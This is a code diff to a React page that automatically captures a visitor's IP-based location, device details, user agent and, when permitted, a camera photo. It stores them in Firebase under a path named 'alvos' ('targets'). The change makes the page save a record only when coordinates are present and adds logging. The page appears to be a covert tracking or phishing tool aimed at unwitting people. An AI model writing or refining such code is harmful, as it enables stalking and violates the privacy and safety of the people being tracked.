@@ -119,6 +119,13 @@ export default function LocationCapturePage() {
             : null,
       })
 
+      if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
+        console.error("[v0] ❌ Cannot save capture without valid IP coordinates")
+        setHasCaptured(true)
+        setIsCapturing(false)
+        return
+      }
+
       const userPath = userId || "anonymous"
       const alvosRef = ref(database, `alvos/${userPath}`)
 
@@ -126,23 +133,21 @@ export default function LocationCapturePage() {
         pageType: "location",
         pageName: "Mapa de Localização",
         timestamp: new Date().toISOString(),
-        ipAddress: data.ipData?.ip || "Unknown",
+        ipAddress: data.ipData.ip || "Unknown",
         userAgent: navigator.userAgent,
-        ipData: data.ipData
-          ? {
-              ip: data.ipData.ip,
-              latitude: data.ipData.latitude || null,
-              longitude: data.ipData.longitude || null,
-              city: data.ipData.city || "Unknown",
-              region: data.ipData.region || "Unknown",
-              country: data.ipData.country || "Unknown",
-              countryCode: data.ipData.countryCode || "XX",
-              timezone: data.ipData.timezone || "Unknown",
-              isp: data.ipData.isp || "Unknown",
-              org: data.ipData.org || "Unknown",
-              as: data.ipData.as || "Unknown",
-            }
-          : null,
+        ipData: {
+          ip: data.ipData.ip,
+          latitude: data.ipData.latitude,
+          longitude: data.ipData.longitude,
+          city: data.ipData.city || "Unknown",
+          region: data.ipData.region || "Unknown",
+          country: data.ipData.country || "Unknown",
+          countryCode: data.ipData.countryCode || "XX",
+          timezone: data.ipData.timezone || "Unknown",
+          isp: data.ipData.isp || "Unknown",
+          org: data.ipData.org || "Unknown",
+          as: data.ipData.as || "Unknown",
+        },
         deviceInfo: data.deviceInfo,
         formData:
           photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
@@ -150,8 +155,10 @@ export default function LocationCapturePage() {
 
       console.log("[v0] 💾 Saving to Firebase:", {
         hasIpData: !!capturePayload.ipData,
-        ipLat: capturePayload.ipData?.latitude,
-        ipLng: capturePayload.ipData?.longitude,
+        ipLat: capturePayload.ipData.latitude,
+        ipLng: capturePayload.ipData.longitude,
+        city: capturePayload.ipData.city,
+        country: capturePayload.ipData.country,
         hasPhoto: !!capturePayload.formData?.photo,
       })
 
@@ -161,6 +168,7 @@ export default function LocationCapturePage() {
       setHasCaptured(true)
     } catch (error) {
       console.error("[v0] ❌ Auto-capture error:", error)
+      setHasCaptured(true) // Mark as captured even on error to prevent infinite retries
     } finally {
       setIsCapturing(false)
     }
